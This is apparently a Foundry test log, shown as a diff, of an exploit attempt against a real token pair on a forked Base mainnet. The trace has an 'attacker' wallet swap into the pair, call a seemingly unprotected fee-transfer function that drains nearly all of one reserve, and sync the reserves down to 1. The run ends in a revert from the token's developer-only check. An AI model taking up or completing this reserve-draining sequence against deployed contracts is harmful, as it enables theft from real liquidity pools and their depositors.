@@ -1,0 +1,136 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DebugOne.t.sol:DebugOne
+[FAIL: Only the developer can call this function] test_debug_two_pairs() (block: 52603030) (gas: 672854)
+Logs:
+  pair: 0xF94334e3dce3fd15762eD2F6658437082c3560d4
+  V_weth: 1099700000000000
+  J_junk: 909338910611985086841866
+  TF: 1
+  paused: 0
+  cost: 5356243
+
+Traces:
+  [672854] DebugOne::test_debug_two_pairs()
+    ├─ [0] VM::envOr("BASE_RPC_URL", "https://mainnet.base.org") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>")
+    │   └─ ← [Return] 0
+    ├─ [351] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::token0() [staticcall]
+    │   └─ ← [Return] 0x4200000000000000000000000000000000000006
+    ├─ [371] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::token1() [staticcall]
+    │   └─ ← [Return] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948
+    ├─ [6620] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::getReserves() [staticcall]
+    │   └─ ← [Return] 1099700000000000 [1.099e15], 909338910611985086841866 [9.093e23], 1690699321 [1.69e9]
+    ├─ emit log_named_address(key: "pair", val: 0xF94334e3dce3fd15762eD2F6658437082c3560d4)
+    ├─ emit log_named_uint(key: "V_weth", val: 1099700000000000 [1.099e15])
+    ├─ emit log_named_uint(key: "J_junk", val: 909338910611985086841866 [9.093e23])
+    ├─ [514] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::_transferFeesSupportingTaxTokens(ECRecover: [0x0000000000000000000000000000000000000001], 0) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "TF", val: 1)
+    ├─ [327] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::factory() [staticcall]
+    │   └─ ← [Return] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19
+    ├─ [2460] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19::isPaused() [staticcall]
+    │   └─ ← [Return] false
+    ├─ emit log_named_uint(key: "paused", val: 0)
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
+    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 10000000000000000 [1e16])
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [44866] 0x4200000000000000000000000000000000000006::deposit{value: 10000000000000000}()
+    │   ├─ emit Deposit(dst: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], wad: 10000000000000000 [1e16])
+    │   └─ ← [Stop]
+    ├─ emit log_named_uint(key: "cost", val: 5356243 [5.356e6])
+    ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 10000000000000000 [1e16]
+    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [34197] 0x4200000000000000000000000000000000000006::transfer(0xF94334e3dce3fd15762eD2F6658437082c3560d4, 5356243 [5.356e6])
+    │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, amount: 5356243 [5.356e6])
+    │   └─ ← [Return] true
+    ├─ [278414] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::swap(0, 4398800000001000 [4.398e15], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 0x)
+    │   ├─ [2460] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19::isPaused() [staticcall]
+    │   │   └─ ← [Return] false
+    │   ├─ [82718] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 4398800000001000 [4.398e15])
+    │   │   ├─ emit Transfer(from: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, to: 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948, amount: 1759520000000400 [1.759e15])
+    │   │   ├─ emit Transfer(from: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 2639280000000600 [2.639e15])
+    │   │   └─ ← [Return] true
+    │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   │   └─ ← [Return] 1099700005356243 [1.099e15]
+    │   ├─ [621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   │   └─ ← [Return] 909338906213185086840866 [9.093e23]
+    │   ├─ [4828] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19::tradingFees(0xF94334e3dce3fd15762eD2F6658437082c3560d4, attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   │   └─ ← [Return] 30
+    │   ├─ [2406] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19::protocolFeesShare() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000001388
+    │   ├─ [2371] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19::protocolFeesRecipient() [staticcall]
+    │   │   └─ ← [Return] 0x000000000000000000000000d40846a19fdc9c8255dccd18bcbb261bdbf5e4db
+    │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C) [staticcall]
+    │   │   └─ ← [Return] 150000000000 [1.5e11]
+    │   ├─ [8601] 0x4200000000000000000000000000000000000006::transfer(0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C, 8034)
+    │   │   ├─ emit Transfer(from: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, to: 0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C, amount: 8034)
+    │   │   └─ ← [Return] true
+    │   ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C) [staticcall]
+    │   │   └─ ← [Return] 150000008034 [1.5e11]
+    │   ├─ [7801] 0x4200000000000000000000000000000000000006::transfer(0xD40846A19fdC9c8255DCcD18BcBB261BDBF5e4db, 8034)
+    │   │   ├─ emit Transfer(from: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, to: 0xD40846A19fdC9c8255DCcD18BcBB261BDBF5e4db, amount: 8034)
+    │   │   └─ ← [Return] true
+    │   ├─  emit topic 0: 0x112c256902bf554b6ed882d2936687aaeb4225e8cd5b51303c90ca6cf43a8602
+    │   │        topic 1: 0x0000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e
+    │   │           data: 0x0000000000000000000000000000000000000000000000000000000000001f620000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   │   └─ ← [Return] 1099700005340175 [1.099e15]
+    │   ├─ [621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   │   └─ ← [Return] 909338906213185086840866 [9.093e23]
+    │   ├─ emit Sync(: 1099700005340175 [1.099e15], : 909338906213185086840866 [9.093e23])
+    │   ├─ emit Swap(sender: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount0In: 5356243 [5.356e6], amount1In: 0, amount0Out: 0, amount1Out: 4398800000001000 [4.398e15], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Stop]
+    ├─ [2621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   └─ ← [Return] 909338906213185086840866 [9.093e23]
+    ├─ [107319] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::_transferFeesSupportingTaxTokens(0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948, 909338906213185086840865 [9.093e23])
+    │   ├─ [2621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [77918] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::transfer(0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C, 909338906213185086840865 [9.093e23])
+    │   │   ├─ emit Transfer(from: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, to: 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948, amount: 363735562485274034736346 [3.637e23])
+    │   │   ├─ emit Transfer(from: 0xF94334e3dce3fd15762eD2F6658437082c3560d4, to: 0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C, amount: 545603343727911052104519 [5.456e23])
+    │   │   └─ ← [Return] true
+    │   ├─ [621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(0x1BCDbdc2c6C3beEB11e2e5c18D40878609e05b2C) [staticcall]
+    │   │   └─ ← [Return] 545603343727911052104519 [5.456e23]
+    │   └─ ← [Return] 545603343727911052104519 [5.456e23]
+    ├─ [57256] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::sync()
+    │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   │   └─ ← [Return] 1099700005340175 [1.099e15]
+    │   ├─ [2621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(0xF94334e3dce3fd15762eD2F6658437082c3560d4) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ emit Sync(: 1099700005340175 [1.099e15], : 1)
+    │   └─ ← [Stop]
+    ├─ [6620] 0xF94334e3dce3fd15762eD2F6658437082c3560d4::getReserves() [staticcall]
+    │   └─ ← [Return] 1099700005340175 [1.099e15], 1, 1791995407 [1.791e9]
+    ├─ [2621] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 2639280000000600 [2.639e15]
+    ├─ [56741] 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948::transfer(0xF94334e3dce3fd15762eD2F6658437082c3560d4, 2639280000000600 [2.639e15])
+    │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948, amount: 1055712000000240 [1.055e15])
+    │   └─ ← [Revert] Only the developer can call this function
+    └─ ← [Revert] Only the developer can call this function
+
+Backtrace:
+  at 0x4Af5901dEFA0A57460590DDFAe8dD635E9eF0948.transfer
+  at DebugOne.test_debug_two_pairs
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 18.03s (18.03s CPU time)
+
+Ran 1 test suite in 51.16s (18.03s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/DebugOne.t.sol:DebugOne
+[FAIL: Only the developer can call this function] test_debug_two_pairs() (block: 52603030) (gas: 672854)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+Tip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger
+EXIT=1
